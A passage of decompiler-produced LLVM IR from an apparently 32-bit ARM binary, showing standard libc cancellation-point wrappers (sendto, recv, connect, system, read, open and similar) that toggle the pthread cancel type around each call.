  %v1_cbcc.pre = load i32, i32* @r8, align 4
  %phitmp = inttoptr i32 %v1_cbcc.pre to i32*
  store i32 0, i32* %phitmp, align 4
  %v2_cbd0 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_cbd0, i32* @r4, align 4
  %v23_cbd0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v23_cbd0

; uselistorder directives
  uselistorder i32 %v0_cb98, { 1, 2, 0 }
  uselistorder i32 %v0_cb2017, { 1, 0, 2 }
  uselistorder i32 %v0_cb64, { 1, 0 }
  uselistorder i32 %v0_cb884, { 6, 2, 4, 5, 3, 1, 0, 7, 8, 9 }
  uselistorder i32 %v2_cb20, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_cb3c, { 3, 2, 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 5, 0 }
  uselistorder i32 (i32)* @__pthread_acquire, { 5, 4, 2, 1, 0, 6, 3 }
  uselistorder label %dec_label_pc_cb70.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_cb4c, { 1, 0 }
  uselistorder label %dec_label_pc_cb20, { 1, 0, 2 }
}

define i32 @sendto() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v3_cbd4 = load i32, i32* @r4, align 4
  %v6_cbd4 = load i32, i32* @r5, align 4
  %v9_cbd4 = load i32, i32* @r6, align 4
  %v12_cbd4 = load i32, i32* @r7, align 4
  %v0_cbdc = load i32, i32* @r0, align 4
  store i32 %v0_cbdc, i32* @r7, align 4
  %v0_cbe0 = load i32, i32* @r1, align 4
  store i32 %v0_cbe0, i32* @r4, align 4
  %v2_cbe8 = ptrtoint i32* %stack_var_-24 to i32
  %v0_cbec = load i32, i32* @r2, align 4
  store i32 %v0_cbec, i32* @r5, align 4
  %v0_cbf0 = load i32, i32* @r3, align 4
  store i32 %v0_cbf0, i32* @r6, align 4
  %v3_cbf4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_cbe8)
  %v0_cc04 = load i32, i32* @r4, align 4
  store i32 %v0_cc04, i32* @r1, align 4
  %v0_cc08 = load i32, i32* @r5, align 4
  store i32 %v0_cc08, i32* @r2, align 4
  %v0_cc0c = load i32, i32* @r6, align 4
  store i32 %v0_cc0c, i32* @r3, align 4
  %v0_cc10 = load i32, i32* @r7, align 4
  store i32 %v0_cc10, i32* @r0, align 4
  %v6_cc18 = call i32 @__libc_sendto(i32 %v0_cc10, i32 %v0_cc04, i32 %v0_cc08, i32 %v0_cc0c, i32 %tmp6, i32 %tmp1)
  store i32 %v6_cc18, i32* @r4, align 4
  %v3_cc24 = load i32, i32* %stack_var_-24, align 4
  %v2_cc28 = trunc i32 %v3_cc24 to i8
  %v3_cc28 = call i32 @__GI_pthread_setcanceltype(i8 %v2_cc28, i32 0)
  %v0_cc2c = load i32, i32* @r4, align 4
  store i32 %v3_cbd4, i32* @r4, align 4
  store i32 %v6_cbd4, i32* @r5, align 4
  store i32 %v9_cbd4, i32* @r6, align 4
  store i32 %v12_cbd4, i32* @r7, align 4
  ret i32 %v0_cc2c
}

define i32 @sendmsg() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v2_cc3c = ptrtoint i32* %stack_var_-20 to i32
  %v0_cc40 = load i32, i32* @r0, align 4
  store i32 %v0_cc40, i32* @r4, align 4
  %v0_cc44 = load i32, i32* @r1, align 4
  store i32 %v0_cc44, i32* @r5, align 4
  %v0_cc48 = load i32, i32* @r2, align 4
  store i32 %v0_cc48, i32* @r6, align 4
  %v3_cc54 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_cc3c)
  %v0_cc58 = load i32, i32* @r5, align 4
  store i32 %v0_cc58, i32* @r1, align 4
  %v0_cc5c = load i32, i32* @r6, align 4
  store i32 %v0_cc5c, i32* @r2, align 4
  %v0_cc60 = load i32, i32* @r4, align 4
  store i32 %v0_cc60, i32* @r0, align 4
  %v3_cc64 = call i32 @__libc_sendmsg(i32 %v0_cc60, i32 %v0_cc58, i32 %v0_cc5c)
  store i32 %v3_cc64, i32* @r4, align 4
  %v2_cc70 = load i32, i32* %stack_var_-20, align 4
  %v2_cc74 = trunc i32 %v2_cc70 to i8
  %v3_cc74 = call i32 @__GI_pthread_setcanceltype(i8 %v2_cc74, i32 0)
  %v0_cc78 = load i32, i32* @r4, align 4
  ret i32 %v0_cc78
}

define i32 @send() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v3_cc84 = load i32, i32* @r4, align 4
  %v6_cc84 = load i32, i32* @r5, align 4
  %v9_cc84 = load i32, i32* @r6, align 4
  %v12_cc84 = load i32, i32* @r7, align 4
  %v2_cc88 = ptrtoint i32* %stack_var_-24 to i32
  %v0_cc8c = load i32, i32* @r0, align 4
  store i32 %v0_cc8c, i32* @r4, align 4
  %v0_cc90 = load i32, i32* @r1, align 4
  store i32 %v0_cc90, i32* @r5, align 4
  %v0_cc94 = load i32, i32* @r2, align 4
  store i32 %v0_cc94, i32* @r6, align 4
  %v0_cc98 = load i32, i32* @r3, align 4
  store i32 %v0_cc98, i32* @r7, align 4
  %v3_cca4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_cc88)
  %v0_cca8 = load i32, i32* @r5, align 4
  store i32 %v0_cca8, i32* @r1, align 4
  %v0_ccac = load i32, i32* @r6, align 4
  store i32 %v0_ccac, i32* @r2, align 4
  %v0_ccb0 = load i32, i32* @r7, align 4
  store i32 %v0_ccb0, i32* @r3, align 4
  %v0_ccb4 = load i32, i32* @r4, align 4
  store i32 %v0_ccb4, i32* @r0, align 4
  %v4_ccb8 = call i32 @__libc_send(i32 %v0_ccb4, i32 %v0_cca8, i32 %v0_ccac, i32 %v0_ccb0)
  store i32 %v4_ccb8, i32* @r4, align 4
  %v2_ccc4 = load i32, i32* %stack_var_-24, align 4
  %v2_ccc8 = trunc i32 %v2_ccc4 to i8
  %v3_ccc8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_ccc8, i32 0)
  %v0_cccc = load i32, i32* @r4, align 4
  store i32 %v3_cc84, i32* @r4, align 4
  store i32 %v6_cc84, i32* @r5, align 4
  store i32 %v9_cc84, i32* @r6, align 4
  store i32 %v12_cc84, i32* @r7, align 4
  ret i32 %v0_cccc
}

define i32 @recvmsg() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v9_ccd8 = load i32, i32* @r6, align 4
  %v2_ccdc = ptrtoint i32* %stack_var_-20 to i32
  %v0_cce0 = load i32, i32* @r0, align 4
  store i32 %v0_cce0, i32* @r4, align 4
  %v0_cce4 = load i32, i32* @r1, align 4
  store i32 %v0_cce4, i32* @r5, align 4
  %v0_cce8 = load i32, i32* @r2, align 4
  store i32 %v0_cce8, i32* @r6, align 4
  %v3_ccf4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_ccdc)
  %v0_ccf8 = load i32, i32* @r5, align 4
  store i32 %v0_ccf8, i32* @r1, align 4
  %v0_ccfc = load i32, i32* @r6, align 4
  store i32 %v0_ccfc, i32* @r2, align 4
  %v0_cd00 = load i32, i32* @r4, align 4
  store i32 %v0_cd00, i32* @r0, align 4
  %v3_cd04 = call i32 @__libc_recvmsg(i32 %v0_cd00, i32 %v0_ccf8, i32 %v0_ccfc)
  store i32 %v3_cd04, i32* @r4, align 4
  %v2_cd10 = load i32, i32* %stack_var_-20, align 4
  %v2_cd14 = trunc i32 %v2_cd10 to i8
  %v3_cd14 = call i32 @__GI_pthread_setcanceltype(i8 %v2_cd14, i32 0)
  %v0_cd18 = load i32, i32* @r4, align 4
  store i32 %v9_ccd8, i32* @r6, align 4
  ret i32 %v0_cd18
}

define i32 @recvfrom() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v9_cd24 = load i32, i32* @r6, align 4
  %v12_cd24 = load i32, i32* @r7, align 4
  %v0_cd2c = load i32, i32* @r0, align 4
  store i32 %v0_cd2c, i32* @r7, align 4
  %v0_cd30 = load i32, i32* @r1, align 4
  store i32 %v0_cd30, i32* @r4, align 4
  %v2_cd38 = ptrtoint i32* %stack_var_-24 to i32
  %v0_cd3c = load i32, i32* @r2, align 4
  store i32 %v0_cd3c, i32* @r5, align 4
  %v0_cd40 = load i32, i32* @r3, align 4
  store i32 %v0_cd40, i32* @r6, align 4
  %v3_cd44 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_cd38)
  %v0_cd54 = load i32, i32* @r4, align 4
  store i32 %v0_cd54, i32* @r1, align 4
  %v0_cd58 = load i32, i32* @r5, align 4
  store i32 %v0_cd58, i32* @r2, align 4
  %v0_cd5c = load i32, i32* @r6, align 4
  store i32 %v0_cd5c, i32* @r3, align 4
  %v0_cd60 = load i32, i32* @r7, align 4
  store i32 %v0_cd60, i32* @r0, align 4
  %v6_cd68 = call i32 @__libc_recvfrom(i32 %v0_cd60, i32 %v0_cd54, i32 %v0_cd58, i32 %v0_cd5c, i32 %tmp6, i32 %tmp1)
  store i32 %v6_cd68, i32* @r4, align 4
  %v3_cd74 = load i32, i32* %stack_var_-24, align 4
  %v2_cd78 = trunc i32 %v3_cd74 to i8
  %v3_cd78 = call i32 @__GI_pthread_setcanceltype(i8 %v2_cd78, i32 0)
  %v0_cd7c = load i32, i32* @r4, align 4
  store i32 %v9_cd24, i32* @r6, align 4
  store i32 %v12_cd24, i32* @r7, align 4
  ret i32 %v0_cd7c
}

define i32 @recv() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v3_cd88 = load i32, i32* @r4, align 4
  %v6_cd88 = load i32, i32* @r5, align 4
  %v9_cd88 = load i32, i32* @r6, align 4
  %v12_cd88 = load i32, i32* @r7, align 4
  %v2_cd8c = ptrtoint i32* %stack_var_-24 to i32
  %v0_cd90 = load i32, i32* @r0, align 4
  store i32 %v0_cd90, i32* @r4, align 4
  %v0_cd94 = load i32, i32* @r1, align 4
  store i32 %v0_cd94, i32* @r5, align 4
  %v0_cd98 = load i32, i32* @r2, align 4
  store i32 %v0_cd98, i32* @r6, align 4
  %v0_cd9c = load i32, i32* @r3, align 4
  store i32 %v0_cd9c, i32* @r7, align 4
  %v3_cda8 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_cd8c)
  %v0_cdac = load i32, i32* @r5, align 4
  store i32 %v0_cdac, i32* @r1, align 4
  %v0_cdb0 = load i32, i32* @r6, align 4
  store i32 %v0_cdb0, i32* @r2, align 4
  %v0_cdb4 = load i32, i32* @r7, align 4
  store i32 %v0_cdb4, i32* @r3, align 4
  %v0_cdb8 = load i32, i32* @r4, align 4
  store i32 %v0_cdb8, i32* @r0, align 4
  %v4_cdbc = call i32 @__libc_recv(i32 %v0_cdb8, i32 %v0_cdac, i32 %v0_cdb0, i32 %v0_cdb4)
  store i32 %v4_cdbc, i32* @r4, align 4
  %v2_cdc8 = load i32, i32* %stack_var_-24, align 4
  %v2_cdcc = trunc i32 %v2_cdc8 to i8
  %v3_cdcc = call i32 @__GI_pthread_setcanceltype(i8 %v2_cdcc, i32 0)
  %v0_cdd0 = load i32, i32* @r4, align 4
  store i32 %v3_cd88, i32* @r4, align 4
  store i32 %v6_cd88, i32* @r5, align 4
  store i32 %v9_cd88, i32* @r6, align 4
  store i32 %v12_cd88, i32* @r7, align 4
  ret i32 %v0_cdd0
}

define i32 @connect() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_cddc = load i32, i32* @r4, align 4
  %v6_cddc = load i32, i32* @r5, align 4
  %v9_cddc = load i32, i32* @r6, align 4
  %v2_cde0 = ptrtoint i32* %stack_var_-20 to i32
  %v0_cde4 = load i32, i32* @r0, align 4
  store i32 %v0_cde4, i32* @r4, align 4
  %v0_cde8 = load i32, i32* @r1, align 4
  store i32 %v0_cde8, i32* @r5, align 4
  %v0_cdec = load i32, i32* @r2, align 4
  store i32 %v0_cdec, i32* @r6, align 4
  %v3_cdf8 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_cde0)
  %v0_cdfc = load i32, i32* @r5, align 4
  store i32 %v0_cdfc, i32* @r1, align 4
  %v0_ce00 = load i32, i32* @r6, align 4
  store i32 %v0_ce00, i32* @r2, align 4
  %v0_ce04 = load i32, i32* @r4, align 4
  store i32 %v0_ce04, i32* @r0, align 4
  %v3_ce08 = call i32 @__libc_connect(i32 %v0_ce04, i32 %v0_cdfc, i32 %v0_ce00)
  store i32 %v3_ce08, i32* @r4, align 4
  %v2_ce14 = load i32, i32* %stack_var_-20, align 4
  %v2_ce18 = trunc i32 %v2_ce14 to i8
  %v3_ce18 = call i32 @__GI_pthread_setcanceltype(i8 %v2_ce18, i32 0)
  %v0_ce1c = load i32, i32* @r4, align 4
  store i32 %v3_cddc, i32* @r4, align 4
  store i32 %v6_cddc, i32* @r5, align 4
  store i32 %v9_cddc, i32* @r6, align 4
  ret i32 %v0_ce1c
}

define i32 @accept() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_ce28 = load i32, i32* @r4, align 4
  %v6_ce28 = load i32, i32* @r5, align 4
  %v9_ce28 = load i32, i32* @r6, align 4
  %v2_ce2c = ptrtoint i32* %stack_var_-20 to i32
  %v0_ce30 = load i32, i32* @r0, align 4
  store i32 %v0_ce30, i32* @r4, align 4
  %v0_ce34 = load i32, i32* @r1, align 4
  store i32 %v0_ce34, i32* @r5, align 4
  %v0_ce38 = load i32, i32* @r2, align 4
  store i32 %v0_ce38, i32* @r6, align 4
  %v3_ce44 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_ce2c)
  %v0_ce48 = load i32, i32* @r5, align 4
  store i32 %v0_ce48, i32* @r1, align 4
  %v0_ce4c = load i32, i32* @r6, align 4
  store i32 %v0_ce4c, i32* @r2, align 4
  %v0_ce50 = load i32, i32* @r4, align 4
  store i32 %v0_ce50, i32* @r0, align 4
  %v3_ce54 = call i32 @__libc_accept(i32 %v0_ce50, i32 %v0_ce48, i32 %v0_ce4c)
  store i32 %v3_ce54, i32* @r4, align 4
  %v2_ce60 = load i32, i32* %stack_var_-20, align 4
  %v2_ce64 = trunc i32 %v2_ce60 to i8
  %v3_ce64 = call i32 @__GI_pthread_setcanceltype(i8 %v2_ce64, i32 0)
  %v0_ce68 = load i32, i32* @r4, align 4
  store i32 %v3_ce28, i32* @r4, align 4
  store i32 %v6_ce28, i32* @r5, align 4
  store i32 %v9_ce28, i32* @r6, align 4
  ret i32 %v0_ce68
}

define i32 @write() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_ce74 = load i32, i32* @r4, align 4
  %v6_ce74 = load i32, i32* @r5, align 4
  %v9_ce74 = load i32, i32* @r6, align 4
  %v2_ce78 = ptrtoint i32* %stack_var_-20 to i32
  %v0_ce7c = load i32, i32* @r0, align 4
  store i32 %v0_ce7c, i32* @r4, align 4
  %v0_ce80 = load i32, i32* @r1, align 4
  store i32 %v0_ce80, i32* @r5, align 4
  %v0_ce84 = load i32, i32* @r2, align 4
  store i32 %v0_ce84, i32* @r6, align 4
  %v3_ce90 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_ce78)
  %v0_ce94 = load i32, i32* @r5, align 4
  store i32 %v0_ce94, i32* @r1, align 4
  %v0_ce98 = load i32, i32* @r6, align 4
  store i32 %v0_ce98, i32* @r2, align 4
  %v0_ce9c = load i32, i32* @r4, align 4
  store i32 %v0_ce9c, i32* @r0, align 4
  %v2_cea0 = call i32 @__libc_write(i32 %v0_ce9c, i32 %v0_ce94)
  store i32 %v2_cea0, i32* @r4, align 4
  %v2_ceac = load i32, i32* %stack_var_-20, align 4
  %v2_ceb0 = trunc i32 %v2_ceac to i8
  %v3_ceb0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_ceb0, i32 0)
  %v0_ceb4 = load i32, i32* @r4, align 4
  store i32 %v3_ce74, i32* @r4, align 4
  store i32 %v6_ce74, i32* @r5, align 4
  store i32 %v9_ce74, i32* @r6, align 4
  ret i32 %v0_ceb4
}

define i32 @waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_cec0 = load i32, i32* @r4, align 4
  %v6_cec0 = load i32, i32* @r5, align 4
  %v2_cec4 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  %v3_cedc = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_cec4)
  %v0_cee0 = load i32, i32* @r5, align 4
  %v0_cee8 = load i32, i32* @r4, align 4
  %v3_ceec = call i32 @__libc_waitpid(i32 %v0_cee8, i32 %v0_cee0, i32 %arg3)
  store i32 %v3_ceec, i32* @r4, align 4
  %v2_cef8 = load i32, i32* %stack_var_-20, align 4
  %v2_cefc = trunc i32 %v2_cef8 to i8
  %v3_cefc = call i32 @__GI_pthread_setcanceltype(i8 %v2_cefc, i32 0)
  %v0_cf00 = load i32, i32* @r4, align 4
  store i32 %v3_cec0, i32* @r4, align 4
  store i32 %v6_cec0, i32* @r5, align 4
  ret i32 %v0_cf00
}

define i32 @wait(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_cf10 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg1, i32* @r4, align 4
  %v3_cf20 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_cf10)
  %v0_cf24 = load i32, i32* @r4, align 4
  %v1_cf28 = call i32 @__libc_wait(i32 %v0_cf24)
  store i32 %v1_cf28, i32* @r4, align 4
  %v2_cf34 = load i32, i32* %stack_var_-12, align 4
  %v2_cf38 = trunc i32 %v2_cf34 to i8
  %v3_cf38 = call i32 @__GI_pthread_setcanceltype(i8 %v2_cf38, i32 0)
  %v0_cf3c = load i32, i32* @r4, align 4
  ret i32 %v0_cf3c
}

define i32 @tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_cf4c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg1, i32* @r4, align 4
  %v3_cf5c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_cf4c)
  %v0_cf60 = load i32, i32* @r4, align 4
  store i32 %v0_cf60, i32* @r0, align 4
  %v1_cf64 = call i32 @__libc_tcdrain(i32 %v0_cf60)
  store i32 %v1_cf64, i32* @r4, align 4
  %v2_cf70 = load i32, i32* %stack_var_-12, align 4
  %v2_cf74 = trunc i32 %v2_cf70 to i8
  %v3_cf74 = call i32 @__GI_pthread_setcanceltype(i8 %v2_cf74, i32 0)
  %v0_cf78 = load i32, i32* @r4, align 4
  ret i32 %v0_cf78
}

define i32 @system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_cf88 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg1, i32* @r4, align 4
  %v3_cf98 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_cf88)
  %v0_cf9c = load i32, i32* @r4, align 4
  %v1_cfa0 = call i32 @__libc_system(i32 %v0_cf9c)
  store i32 %v1_cfa0, i32* @r4, align 4
  %v2_cfac = load i32, i32* %stack_var_-12, align 4
  %v2_cfb0 = trunc i32 %v2_cfac to i8
  %v3_cfb0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_cfb0, i32 0)
  %v0_cfb4 = load i32, i32* @r4, align 4
  ret i32 %v0_cfb4
}

define i32 @read() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v6_cfc0 = load i32, i32* @r5, align 4
  %v9_cfc0 = load i32, i32* @r6, align 4
  %v2_cfc4 = ptrtoint i32* %stack_var_-20 to i32
  %v0_cfc8 = load i32, i32* @r0, align 4
  store i32 %v0_cfc8, i32* @r4, align 4
  %v0_cfcc = load i32, i32* @r1, align 4
  store i32 %v0_cfcc, i32* @r5, align 4
  %v0_cfd0 = load i32, i32* @r2, align 4
  store i32 %v0_cfd0, i32* @r6, align 4
  %v3_cfdc = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_cfc4)
  %v0_cfe0 = load i32, i32* @r5, align 4
  store i32 %v0_cfe0, i32* @r1, align 4
  %v0_cfe4 = load i32, i32* @r6, align 4
  store i32 %v0_cfe4, i32* @r2, align 4
  %v0_cfe8 = load i32, i32* @r4, align 4
  store i32 %v0_cfe8, i32* @r0, align 4
  %v1_cfec = call i32 @__libc_read(i32 %v0_cfe8)
  store i32 %v1_cfec, i32* @r4, align 4
  %v2_cff8 = load i32, i32* %stack_var_-20, align 4
  %v2_cffc = trunc i32 %v2_cff8 to i8
  %v3_cffc = call i32 @__GI_pthread_setcanceltype(i8 %v2_cffc, i32 0)
  %v0_d000 = load i32, i32* @r4, align 4
  store i32 %v6_cfc0, i32* @r5, align 4
  store i32 %v9_cfc0, i32* @r6, align 4
  ret i32 %v0_d000
}

define i32 @pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_d010 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg4, i32* @r7, align 4
  %v3_d02c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d010)
  %v0_d030 = load i32, i32* @r5, align 4
  store i32 %v0_d030, i32* @r1, align 4
  %v0_d034 = load i32, i32* @r6, align 4
  store i32 %v0_d034, i32* @r2, align 4
  %v0_d038 = load i32, i32* @r7, align 4
  store i32 %v0_d038, i32* @r3, align 4
  %v0_d03c = load i32, i32* @r4, align 4
  store i32 %v0_d03c, i32* @r0, align 4
  %v4_d040 = call i32 @__libc_pwrite(i32 %v0_d03c, i32 %v0_d030, i32 %v0_d034, i32 %v0_d038)
  store i32 %v4_d040, i32* @r4, align 4
  %v2_d04c = load i32, i32* %stack_var_-24, align 4
  %v2_d050 = trunc i32 %v2_d04c to i8
  %v3_d050 = call i32 @__GI_pthread_setcanceltype(i8 %v2_d050, i32 0)
  %v0_d054 = load i32, i32* @r4, align 4
  ret i32 %v0_d054
}

define i32 @pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg5, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v2_d084 = ptrtoint i32* %stack_var_-32 to i32
  %v3_d08c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d084)
  %v0_d090 = load i32, i32* @r4, align 4
  %v0_d094 = load i32, i32* @r6, align 4
  store i32 %v0_d094, i32* @r1, align 4
  %v0_d098 = load i32, i32* @r7, align 4
  store i32 %v0_d098, i32* @r2, align 4
  %v0_d09c = load i32, i32* @r8, align 4
  store i32 %v0_d09c, i32* @r0, align 4
  %v0_d0a0 = load i32, i32* @r5, align 4
  %v5_d0a4 = call i32 @__libc_pread64(i32 %v0_d09c, i32 %v0_d094, i32 %v0_d098, i32 %v0_d090, i32 %v0_d0a0)
  store i32 %v5_d0a4, i32* @r4, align 4
  %v3_d0b0 = load i32, i32* %stack_var_-32, align 4
  %v2_d0b4 = trunc i32 %v3_d0b0 to i8
  %v3_d0b4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_d0b4, i32 0)
  %v0_d0b8 = load i32, i32* @r4, align 4
  ret i32 %v0_d0b8
}

define i32 @pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_d0d0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg4, i32* @r7, align 4
  %v3_d0ec = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d0d0)
  %v0_d0f0 = load i32, i32* @r5, align 4
  store i32 %v0_d0f0, i32* @r1, align 4
  %v0_d0f4 = load i32, i32* @r6, align 4
  store i32 %v0_d0f4, i32* @r2, align 4
  %v0_d0f8 = load i32, i32* @r7, align 4
  store i32 %v0_d0f8, i32* @r3, align 4
  %v0_d0fc = load i32, i32* @r4, align 4
  store i32 %v0_d0fc, i32* @r0, align 4
  %v4_d100 = call i32 @__libc_pread(i32 %v0_d0fc, i32 %v0_d0f0, i32 %v0_d0f4, i32 %v0_d0f8)
  store i32 %v4_d100, i32* @r4, align 4
  %v2_d10c = load i32, i32* %stack_var_-24, align 4
  %v2_d110 = trunc i32 %v2_d10c to i8
  %v3_d110 = call i32 @__GI_pthread_setcanceltype(i8 %v2_d110, i32 0)
  %v0_d114 = load i32, i32* @r4, align 4
  ret i32 %v0_d114
}

define i32 @pause() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_d124 = ptrtoint i32* %stack_var_-12 to i32
  %v3_d130 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d124)
  %v1_d134 = call i32 @__libc_pause(i32 %v3_d130)
  store i32 %v1_d134, i32* @r4, align 4
  %v2_d140 = load i32, i32* %stack_var_-12, align 4
  %v2_d144 = trunc i32 %v2_d140 to i8
  %v3_d144 = call i32 @__GI_pthread_setcanceltype(i8 %v2_d144, i32 0)
  %v0_d148 = load i32, i32* @r4, align 4
  ret i32 %v0_d148
}

define i32 @open64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_d164 = ptrtoint i32* %stack_var_-24 to i32
  %v3_d16c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d164)
  %v2_d170 = ptrtoint i32* %stack_var_-4 to i32
  %v0_d17c = load i32, i32* @r4, align 4
  store i32 %v0_d17c, i32* @r0, align 4
  %v5_d184 = call i32 @__GI___libc_open64(i32 %v0_d17c, i32 %arg2, i32 %arg3, i32 %v2_d170, i32 %v2_d170)
  store i32 %v5_d184, i32* @r4, align 4
  %v3_d190 = load i32, i32* %stack_var_-24, align 4
  %v2_d194 = trunc i32 %v3_d190 to i8
  %v3_d194 = call i32 @__GI_pthread_setcanceltype(i8 %v2_d194, i32 0)
  %v0_d198 = load i32, i32* @r4, align 4
  ret i32 %v0_d198

; uselistorder directives
  uselistorder i32 %v2_d170, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @open() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v3_d1ac = load i32, i32* @r1, align 4
  %v0_d1b8 = load i32, i32* @r0, align 4
  store i32 %v0_d1b8, i32* @r4, align 4
  %v2_d1bc = ptrtoint i32* %stack_var_-24 to i32
  %v3_d1c4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d1bc)
  %v0_d1d4 = load i32, i32* @r4, align 4
  store i32 %v0_d1d4, i32* @r0, align 4
  %v2_d1dc = call i32 @__libc_open(i32 %v0_d1d4, i32 %v3_d1ac)
  store i32 %v2_d1dc, i32* @r4, align 4
  %v3_d1e8 = load i32, i32* %stack_var_-24, align 4
  %v2_d1ec = trunc i32 %v3_d1e8 to i8
  %v3_d1ec = call i32 @__GI_pthread_setcanceltype(i8 %v2_d1ec, i32 0)
  %v0_d1f0 = load i32, i32* @r4, align 4
  ret i32 %v0_d1f0
}

define i32 @nanosleep() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_d204 = load i32, i32* @r4, align 4
  %v6_d204 = load i32, i32* @r5, align 4
  %v2_d208 = ptrtoint i32* %stack_var_-16 to i32
  %v0_d20c = load i32, i32* @r0, align 4
  store i32 %v0_d20c, i32* @r4, align 4
  %v0_d210 = load i32, i32* @r1, align 4
  store i32 %v0_d210, i32* @r5, align 4
  %v3_d21c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d208)
  %v0_d220 = load i32, i32* @r5, align 4
  store i32 %v0_d220, i32* @r1, align 4
  %v0_d224 = load i32, i32* @r4, align 4
  store i32 %v0_d224, i32* @r0, align 4
  %v1_d228 = call i32 @__libc_nanosleep(i32 %v0_d224)
  store i32 %v1_d228, i32* @r4, align 4
  %v2_d234 = load i32, i32* %stack_var_-16, align 4
  %v2_d238 = trunc i32 %v2_d234 to i8
  %v3_d238 = call i32 @__GI_pthread_setcanceltype(i8 %v2_d238, i32 0)
  %v0_d23c = load i32, i32* @r4, align 4
  store i32 %v3_d204, i32* @r4, align 4
  store i32 %v6_d204, i32* @r5, align 4
  ret i32 %v0_d23c
}

define i32 @msync() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v2_d24c = ptrtoint i32* %stack_var_-20 to i32
  %v0_d250 = load i32, i32* @r0, align 4
  store i32 %v0_d250, i32* @r4, align 4
  %v0_d254 = load i32, i32* @r1, align 4
  store i32 %v0_d254, i32* @r5, align 4
  %v0_d258 = load i32, i32* @r2, align 4
  store i32 %v0_d258, i32* @r6, align 4
